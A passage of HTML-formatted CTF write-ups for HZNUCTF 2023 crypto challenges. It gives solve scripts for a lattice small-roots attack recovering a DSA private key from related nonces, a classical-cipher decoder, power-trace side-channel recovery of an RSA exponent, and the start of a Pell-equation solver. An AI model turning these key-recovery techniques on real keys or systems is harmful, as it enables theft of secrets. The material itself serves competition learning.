class=\"token keyword\">for</span> monomial <span class=\"token keyword\">in</span> monomials<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token keyword\">for</span> i<span class=\"token punctuation\">,</span> factor <span class=\"token keyword\">in</span> <span class=\"token builtin\">enumerate</span><span class=\"token punctuation\">(</span>factors<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\tB<span class=\"token punctuation\">.</span>rescale_col<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> factor<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\tB <span class=\"token operator\">=</span> B<span class=\"token punctuation\">.</span>dense_matrix<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>LLL<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\tB <span class=\"token operator\">=</span> B<span class=\"token punctuation\">.</span>change_ring<span class=\"token punctuation\">(</span>QQ<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t<span class=\"token keyword\">for</span> i<span class=\"token punctuation\">,</span> factor <span class=\"token keyword\">in</span> <span class=\"token builtin\">enumerate</span><span class=\"token punctuation\">(</span>factors<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t\tB<span class=\"token punctuation\">.</span>rescale_col<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token operator\">/</span>factor<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\tH <span class=\"token operator\">=</span> Sequence<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> f<span class=\"token punctuation\">.</span>parent<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>change_ring<span class=\"token punctuation\">(</span>QQ<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t<span class=\"token keyword\">for</span> h <span class=\"token keyword\">in</span> <span class=\"token builtin\">filter</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> B<span class=\"token operator\">*</span>monomials<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t\tH<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t\tI <span class=\"token operator\">=</span> H<span class=\"token punctuation\">.</span>ideal<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> I<span class=\"token punctuation\">.</span>dimension<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t\t\tH<span class=\"token punctuation\">.</span>pop<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t\t<span class=\"token keyword\">elif</span> I<span class=\"token punctuation\">.</span>dimension<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t\t\troots <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t\t\t<span class=\"token keyword\">for</span> root <span class=\"token keyword\">in</span> I<span class=\"token punctuation\">.</span>variety<span class=\"token punctuation\">(</span>ring<span class=\"token operator\">=</span>ZZ<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t\t\t\troot <span class=\"token operator\">=</span> <span class=\"token builtin\">tuple</span><span class=\"token punctuation\">(</span>R<span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">[</span>var<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> var <span class=\"token keyword\">in</span> f<span class=\"token punctuation\">.</span>variables<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t\t\t\troots<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> roots</pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token punctuation\">(</span>r1<span class=\"token punctuation\">,</span> s1<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">43665657147136977892760835332544097729763754398125679419859037123212964274095</span><span class=\"token punctuation\">,</span> <span class=\"token number\">11372107439153704547599978617809027960018057676066118055075660375442954789009</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token punctuation\">(</span>r2<span class=\"token punctuation\">,</span> s2<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">29184887007213204285288676779168140587575609668559831035949650649308618592275</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5011738292572181542092375902756977363590922060964162373234404450451520414798</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token number\">31961141251107494919420190534228520246958409864267239760354623819192809291490262139213317490432416411403367763443527530375117617196123131270496004125231254335150221348901335274505489844222882171272650010562960614279185073793274638651086760235178963210965828168433516820007716846876686795459738332444629111764967204355463398049697867061034126529189537688874999118692225915790053920062142349951686250122300061810240375783724631961234942175580462986265098353263395579346466921241016500821787793395554444982717141449909744838267161237273856377774256250949274635575801148994817767751541256849860886577256992383324866941911</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>q <span class=\"token operator\">=</span> <span class=\"token number\">69375998045163628324086568160767337544901252262545889505892695427466730978301</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>g <span class=\"token operator\">=</span> <span class=\"token number\">23095306638137759877487469277470910487928442296144598697677211337473146684728707820084075779044942034329888686699655576145455963231144004571165817481066424910959951439014314776050521403558035997997820617824839889597136772108383034876458141163933312284054415480674388788905935457149956424898637134087874179010376667509489926236214865373552518669840236207944772752416668193786003948717604980584661094548997197117467440864460714843246250800575997370964173558788145639802963655916833143883799542309432910222224223561677245110195809587171802538978009246887077924173034608600837785506594525481696000424121705524449481831586</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>y <span class=\"token operator\">=</span> <span class=\"token number\">30195133393879069638917191223585579396119430591488890396938821804398771785068454607425044458865556053274470709839502680269466948174813926392729790863065933078609827279352860810689776644132512095691760326095517755483748554008211568781998662554432781285208646921699265866446498342049913829592480268053599307065979016922204438675164034767731708343084371572648019835171087671868322447023378942812010740490724160077164191297435291229504616686997442254543493394641023587237077429236872101951650325361004443988267286616139798736713430746804524113024341440435623834197278500144543476528466395780355874841379098027115073850819</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>h <span class=\"token operator\">=</span> <span class=\"token number\">19905280947443115569469777697852124038269468456842113763109865796452965095134</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>P<span class=\"token punctuation\">.</span><span class=\"token operator\">&lt;</span>k1<span class=\"token punctuation\">,</span>x0<span class=\"token operator\">></span> <span class=\"token operator\">=</span> PolynomialRing<span class=\"token punctuation\">(</span>Zmod<span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>f <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>s2<span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>k1<span class=\"token operator\">^</span><span class=\"token number\">2</span><span class=\"token operator\">+</span>x0<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> h<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> inverse<span class=\"token punctuation\">(</span>r2<span class=\"token punctuation\">,</span>q<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span>s1<span class=\"token operator\">*</span>k1<span class=\"token operator\">-</span>h<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>inverse<span class=\"token punctuation\">(</span>r1<span class=\"token punctuation\">,</span>q<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"59\"></td><td><pre>k1_<span class=\"token punctuation\">,</span>x0_ <span class=\"token operator\">=</span> small_roots<span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">,</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token number\">64</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>m<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>k1_<span class=\"token punctuation\">,</span>x0_<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>d <span class=\"token operator\">=</span> ZZ<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>s1<span class=\"token operator\">*</span>k1_ <span class=\"token operator\">-</span> h<span class=\"token punctuation\">)</span>  <span class=\"token operator\">*</span>inverse<span class=\"token punctuation\">(</span>r1<span class=\"token punctuation\">,</span>q<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> q<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"hznuctf-2023-preliminary噫~\"><a class=\"markdownIt-Anchor\" href=\"#hznuctf-2023-preliminary噫~\">#</a> [HZNUCTF 2023 preliminary] 噫～</h2>\n<p>rust 写的一个简单古典密码。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> gmpy2 <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>f <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'output.txt'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>a <span class=\"token operator\">=</span> <span class=\"token number\">37</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>b <span class=\"token operator\">=</span> <span class=\"token number\">52</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    c_ <span class=\"token operator\">=</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">[</span>i<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    b <span class=\"token operator\">+=</span> c_ <span class=\"token operator\">%</span> <span class=\"token number\">127</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    o <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> b<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> invert<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span><span class=\"token number\">127</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">127</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>o<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"hznuctf-2023-preliminaryside-channel\"><a class=\"markdownIt-Anchor\" href=\"#hznuctf-2023-preliminaryside-channel\">#</a> [HZNUCTF 2023 preliminary]side-channel</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL3RyYWRhaGFja2luZy9oaXRiLWdzZWMtc2luZ2Fwb3JlLTIwMTctY3RmLXdyaXRlLXVwcy1jcnlwdG8tY2F0ZWdvcnktODAzZDZjNzcwMTAz\">refer</span></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">16059123945822694365158124950198825543484999519589187888337200553255798544440036832262284563838976515808578129291536616599557509264533073851159103105883072060720056631597958188429575916683604682603283361472163393387285175934398999920713460521688171388856936854606011599111757398384341169379550343011380822651520763942589923801782398753464143234709393484148664365254994860713155476167800961464275898199226390381810969888945023697984476906037653190402170336314921539242675073226168525550913706593532778562652428903475444637793556112819371434228940595513275038805389841060879447191510666943970447241850404552926199602519</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">23676198353119272891587164142576908690376901293686314942784353146059194045274633032364567515126717515053410457120247729623176193595913335169727137670521232494953911307651873224240918425478358455021118904693825635883056533658237193708645648054998837744523526377375370015128407346231287149043212742478188696880965471297198589414377055357200554254450863749395859378259685909927883404933139662201392110242455689394258060803403855280967030411722557398887495577523627779690177862295719147486918280447692742391730411876509056043404048460252304050528824186627531118009773552255554195757232387432726685926648422550200240296689</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">0x6a415f728907e12e2af16275da3de93f29640272116b61e36963241eabe10d63b40ace499ed4b5228acc331ff43eabae8c2ffc3ad563397dc9f67e1156000501ca74dddcb540b4de9ef5ddfd1cfc30ff012ea6542bc41c59e694e227d0f2b0e6f3e242df0e1484b02715afefe7ade7375bdd39f9230b705b63efa6d1b11e68caacb5e0dbd83c8204d2cb029722b1cf5ab148a5be7bab10519c0e2f12db9195fa6e2a974f2d6c16aa0cae44d8090c821ee3a344c0756e23cc6d1932155a334648a4a06285b80d4961c3652dba963107cb10e8b7dee5ebd677529486c8b54d230cd65e015767d23b9c79ed2d1a5a068e907b285a4ad65e4b0c2de727252a85f480</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./data.txt'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    data <span class=\"token operator\">=</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">','</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>data <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> data<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'point number:'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>start_point <span class=\"token operator\">=</span> <span class=\"token number\">0</span>   <span class=\"token comment\"># 开始分析的点</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>mid <span class=\"token operator\">=</span> <span class=\"token number\">50</span>            <span class=\"token comment\"># 采样点间隔</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>fence <span class=\"token operator\">=</span> <span class=\"token number\">228</span>         <span class=\"token comment\"># 高低电平分界线</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>bin_array <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">for</span> point_index <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>start_point<span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> mid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">if</span> data<span class=\"token punctuation\">[</span>point_index<span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> fence<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        bin_array<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        bin_array<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>bin_array2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>flag1 <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>flag2 <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> bin_array<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">if</span> x<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token keyword\">if</span> flag1<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            flag2 <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>            flag1 <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token keyword\">if</span> flag2<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            bin_array2<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>            bin_array2<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        flag1 <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        flag2 <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">power_mod</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    ans <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    a <span class=\"token operator\">%=</span> c</pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token keyword\">while</span> b <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token keyword\">if</span> b <span class=\"token operator\">%</span> <span class=\"token number\">2</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>            ans <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>ans <span class=\"token operator\">*</span> a<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> c</pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        b <span class=\"token operator\">//=</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        a <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>a <span class=\"token operator\">*</span> a<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> c</pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token keyword\">return</span> ans</pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token comment\"># d_bin = bin_array2[::-1]</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>d_bin <span class=\"token operator\">=</span> bin_array2</pre></td></tr><tr><td data-num=\"54\"></td><td><pre>d <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> d_bin<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>d_int <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>d_int<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>power_mod<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d_int<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"hznuctf-2023-preliminary你的背包~\"><a class=\"markdownIt-Anchor\" href=\"#hznuctf-2023-preliminary你的背包~\">#</a> [HZNUCTF 2023 preliminary] 你的背包～</h2>\n<p>rust 写的带模背包，但是维度很高，不过发现模数 p 是固定的，可以参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmltYUJsdWUvYXJ0aWNsZXMvMTcxODQzNzcuaHRtbA==\">春秋杯 notKnapsack</span> 的打法。exp 基本照搬就可以，不贴了。</p>\n<h2 id=\"hznuctf-2023-final一步到喂\"><a class=\"markdownIt-Anchor\" href=\"#hznuctf-2023-final一步到喂\">#</a> [HZNUCTF 2023 final] 一步到喂</h2>\n<p>就考了个佩尔方程。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> sage<span class=\"token punctuation\">.</span><span class=\"token builtin\">all</span> <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token number\">9850212100620338486478343799784951721581757936621772924971218807300819701941457605399099898870264241518769370682330612103782092302148525012450902351701339</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>q <span class=\"token operator\">=</span> <span class=\"token number\">10749429992014823019923966246896511618886613763258781706004694804949547801668777655988055847885755337127548775758133804022361510427909703124161450470578543</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">66847321508502017574023222490247591875197038421108556106531660421662626233521063441647157067220450229816184622038471812597874582613385516838920632450015292570673816423432903604941781889308906893966588610214614726388822851471695742453496232748358301888465563812947038856742838097152549971517159475947566599664</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>a <span class=\"token operator\">=</span> <span class=\"token number\">1293023064232431070902426583269468463</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>b <span class=\"token operator\">=</span> <span class=\"token number\">105279230912868770223946474836383391725923</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">solve_pell</span><span class=\"token punctuation\">(</span>N<span class=\"token punctuation\">,</span>numTry<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    cf <span class=\"token operator\">=</span> continued_fraction<span class=\"token punctuation\">(</span>sqrt<span class=\"token punctuation\">(</span>N<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>numTry<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        denom <span class=\"token operator\">=</span> cf<span class=\"token punctuation\">.</span>denominator<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        numer <span class=\"token operator\">=</span> cf<span class=\"token punctuation\">.</span>numerator<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">if</span> numer<span class=\"token operator\">^</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> N <span class=\"token operator\">*</span> denom<span class=\"token operator\">^</span><span class=\"token number\">2</span> <span class=\"token operator\">==</span> <span 